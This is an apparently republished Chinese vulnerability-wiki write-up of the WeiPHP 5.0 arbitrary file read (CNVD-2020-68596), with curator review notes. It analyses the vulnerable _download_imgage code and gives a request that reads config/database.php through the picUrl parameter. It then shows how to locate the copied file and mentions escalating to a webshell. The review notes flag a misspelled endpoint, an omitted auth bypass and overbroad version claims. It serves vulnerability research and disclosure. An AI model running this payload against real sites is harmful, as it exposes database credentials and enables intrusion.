---
cnvd: "CNVD-2020-68596"
version: "Weiphp <= 5.0"
source: "Threekiii/Vulnerability-Wiki"
product: "WeiPHP / Material图片下载"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2020-68596"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596"
prerequisites: "来源所述条件，未列明部分仍待核：写<=5.0，实际5.0未锁commit；权限绕过需与WebBase POST问题组合"
side_effects: "未执行；本文需注意的操作影响：读取具有落地泄露副作用；把敏感配置复制成public图片并写数据库，未给清理与权限风险"
source_status: "unknown"
id: "vw-ebef9cef3c077eec057cfb73"
entity_id: "ve-c729fb052ad82762eecfbf73"
schema_version: "1"
canonical: "Web安全/开发框架/WeiPHP/Weiphp5-0 前台文件任意读取 CNVD-2020-68596.md"
relation_type: "duplicate_of"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：写&lt;=5.0，实际5.0未锁commit；权限绕过需与WebBase POST问题组合

代码与实验材料：完整_download_imgage、addFile、user_pics源码及读取配置流程；结果依图

来源证据范围：有官方安装手册，内容与PeiQi原稿599同文

- **结论使用边界（1）**：文件名发现URL拼错；依据：源码user_pics，最终URL却user_pids，直接跟随无法复现。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：public方法不等于无认证网络访问；依据：正文以public直接推公共调用，缺路由/基类鉴权与请求方法；599原稿明确POST绕过被省略。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（3）**：读取具有落地泄露副作用；依据：把敏感配置复制成public图片并写数据库，未给清理与权限风险。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **事实待核（4）**：影响范围过宽；依据：只5.0环境，&lt;=5.0无历史各版本支持。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596

## 漏洞描述

Weiphp5.0 存在前台文件任意读取漏洞，可以读取数据库配置等敏感文件

## 漏洞影响

```
Weiphp <= 5.0
```

## 网络测绘

```
app="WeiPHP"
```

## 环境搭建

[weiphp5.0官方下载参考手册](https://www.weiphp.cn/doc/Initialization_database.html)

参考官方手册创建网站即可

![image-20220518155931404](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181559468.png)

漏洞函数文件:`application\material\controller\Material.php`

漏洞函数:`_download_imgage`

![image-20220518160008264](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181600401.png)

```
public function _download_imgage($media_id, $picUrl = '', $dd = null)
    {
        $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d');
        mkdirs($savePath);
        $cover_id = 0;
        if (empty($picUrl)) {
            // 获取图片URL
            $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token();
            $param['media_id'] = $media_id;
            // dump($url);
            $picContent = post_data($url, $param, 'json', false);
            $picjson = json_decode($picContent, true);
            // dump($picjson);die;
            if (isset($picjson['errcode']) && $picjson['errcode'] != 0) {
                $cover_id = do_down_image($media_id, $dd['thumb_url']);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
            $picName = NOW_TIME . uniqid() . '.jpg';
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $picContent);
        } else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
            if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
            }
            $picName = NOW_TIME . uniqid() . '.' . $picExt;
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
        }

        if ($res) {
            $file = array(
                'name' => $picName,
                'type' => 'application/octet-stream',
                'tmp_name' => $picPath,
                'size' => $res,
                'error' => 0
            );

            $File = D('home/Picture');
            $cover_id = $File->addFile($file);
        }
        return $cover_id;
}
```

首先注意到函数的标识为`public`，也就是这个函数是公共调用的，并且变量`picUrl`为可控变量

根据代码从上向下分析

```
$savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d');
```

```
else {
            $content = wp_file_get_contents($picUrl);
            // 获取图片扩展名
            $picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
            if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
            }
            $picName = NOW_TIME . uniqid() . '.' . $picExt;
            $picPath = $savePath . '/' . $picName;
            $res = file_put_contents($picPath, $content);
            if (!$res) {
                $cover_id = do_down_image($media_id);
                if (!$cover_id) {
                    return 0;
                    exit();
                }
            }
```

分析传入变量 `picUrl` 的 `wp_file_get_contents`方法

```
$content = wp_file_get_contents($picUrl);
```

函数文件位置 `application\common.php`

![image-20220518160112407](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181601465.png)

可以看到这里没有对我们的参数进行过滤，只做了一个有关超时的操作, 回到函数继续向下分析

```
$picExt = substr($picUrl, strrpos($picUrl, '=') + 1);
if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) {
                $picExt = 'jpg';
}
$picName = NOW_TIME . uniqid() . '.' . $picExt;
$picPath = $savePath . '/' . $picName;
$res = file_put_contents($picPath, $content);
```

这里创建了有关当前时间的图片文件，并写入文件夹`/public/uploads/picture/` 下

我们先尝试控制变量 `$picUrl` 来写入数据库配置文件到图片中

```
/public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
```

![image-20220518160132259](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181601329.png)

查看目录`/public/uploads/picture/`，并用记事本打开写入的jpg文件

![image-20220518160149362](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181601445.png)

得到数据库配置文件的信息，既然这个变量可控，我们也可以通过这个方法下载木马文件，再通过解析漏洞或者文件包含等其他漏洞来getshell

![image-20220518160204626](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181602698.png)

在当前条件下并不知道文件名是什么，所以回到代码中继续寻找可以获取文件名的办法

![image-20220518160225049](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181602112.png)

```
if ($res) {
            $file = array(
                'name' => $picName,
                'type' => 'application/octet-stream',
                'tmp_name' => $picPath,
                'size' => $res,
                'error' => 0
            );

            $File = D('home/Picture');
            $cover_id = $File->addFile($file);
        }
```

向下跟进 `addFile` 函数

函数位置:`application\home\model\Picture.php`

![image-20220518160239897](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181602963.png)

```
function addFile($file)
    {
        $data['md5'] = md5_file($file['tmp_name']);
        $id = $this->where('md5', $data['md5'])->value('id');
        if ($id > 0) {
            return $id;
        }

        $info = pathinfo($file['tmp_name']);
        $data['path'] = str_replace(SITE_PATH . '/public', '', $file['tmp_name']);

        $data['sha1'] = hash_file('sha1', $file['tmp_name']);
        $data['create_time'] = NOW_TIME;
        $data['status'] = 1;
        $data['wpid'] = get_wpid();

        $id = $this->insertGetId($data);
        return $id;
    }
```

可以看到这部分代码写入了 Picture 表中

```
$id = $this->insertGetId($data);
```

我们查看一下数据库的这个数据表，可以发现之前所上传的数据全部缓存在这个表里了

![image-20220518160254667](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181602824.png)

我们现在则需要找到不需要登录的地方来获得这些数据，所以可以全局去查找调用了这个 Picture 表的地方

![image-20220518160312578](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181603655.png)

找到一处可以利用的地方

```
function user_pics()
    {
        $map['wpid'] = get_wpid();
        $picList = M('Picture')->where(wp_where($map))
            ->order('id desc')
            ->select();
        $this->assign('picList', $picList);
        exit($this->fetch());
    }
```

跟进 `get_wpid` 函数

```
function get_wpid($wpid = '')
{
    if (defined('WPID')) {
        return WPID;
    } else {
        return 0;
    }
}
```

查看 WPID 的定义，文件位置在`config\weiphp_define.php`

![image-20220518160335575](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181603854.png)

定义值默认为 1，所以这里调用则可以获得数据库中Pictrue表的内容，间接的知道了文件内容以及文件名

访问地址: http://webphp/public/index.php/home/file/user_pids

![image-20220518160401674](./.resource/WeiPHP5.0-download_imgage-前台文件任意读取-CNVD-2020-68596/media/202205181604752.png)

可以看到文件名，根据url地址访问选择下载即可

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
